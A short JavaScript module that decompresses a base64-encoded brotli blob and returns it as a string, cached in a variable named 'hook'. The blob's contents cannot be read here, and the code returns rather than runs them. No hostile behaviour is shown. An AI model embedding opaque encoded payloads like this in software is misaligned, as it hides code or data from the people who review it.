let hook

module.exports.getContent = () => {
  if (typeof hook === `undefined`)
    hook = require('zlib')
      .brotliDecompressSync(
        Buffer.from(
          'G6ENAIzDdKtxyzNwShnmv6vZfS6ntw4JpSsKYUWNsT91Jtp6gyiY9fX7P/p54KEkGFHdmTfvb9uub2nbOSrQjuepdWJZP4b+V8iIzs6VJZOHoPKQja5QbnNHt4DB4KXYCsgBCkZl49+Q4Fw7OAyC/xkR1ic05oAVDtsUs1e33llRwetvFzrUA6jkRf05VEMGHuXEkbUxJZ1hGQNhRqT2ZNKpqAZdaVD5MHCvaoIUjcTRcqtABHe/GRTWnVZLREJ404NxvvGqOHNVD0+UylApyjV7SQ8QL9BJJZpg6eNE6NBoZWEpsx/URMsh+hEOhGCD1ycg6sqDKflercJfDPJWGUbJjDDjUAls/nRo9AcTI0yy8ZD9h4qHdiCEjKUn3rGNBiyWTrIcYjoFCx8/N5lx7gHQSsAki4PfkQ4FnoK7FtLIsACmJYQ/f/f+uI6cX7mg4+XnuTQBdJuFnDMvzDnqO+H2vJ67wMzrB28Euv+iCsLaKxUl5Qlrv7+T5iwaxNyQcz8OK8LgLxDEU6pVTIbIFyAdPJJGyeWjwRCbjUi31HkZuQg8qmEct0TByutrIq6vYSjFA7lZHGRptQ5S8pXCi3JCH0pyffn6Yq/PXl7t6dXLZkuP7fvZs93y6aO/WzCYv4vMP5IcqCEbN6ywKwu9xESUTFwRaLeD4yciQusI8zKnp+qlfwHD4Tr59yDLYp5zHAA7BdVIfboqeGy9UpB72gt9jZa09PfFENDfrD5HzM0gb/QfPEYcZ7o30rQ8beVKeioyG7WKaAn86phKispbCjrFOyZC5YX3eWGo0Oo+uFPaWYnDgpJiFIewEC8uilpMGJu9TyHIXwnz6crFpI5HU9H6sCEpKd6zV65S4aHBMg2po5LEVYnXWsmIicoruccXxVVI6iLDRUbOcU59pxcMT1K3v1B1W8JQW2UrGU1hXFXmqxKR2gb8CVzaqn4IXsMTazQrGN8VrtvopOt/NINB0PrBwpFX88qd3F4x3deEn1v2UGLsgn9VG7pdafkd7d3m+wLM3iHy3a3fTVPs+KL4/vfxBbZKfn2XULsXXSxDhXKhxymMYPDzl9yJTY2IDOqeBmVQySevnKW8WcXVIar+PNKtGXkFxhjML82ZPQ6j3ShrHzhwM1HGOWqiJ7PCbTQcAEo0p1TrUaPWua5xJUk6+vyOKaMHAQ==',
          'base64'
        )
      )
      .toString()

  return hook
}
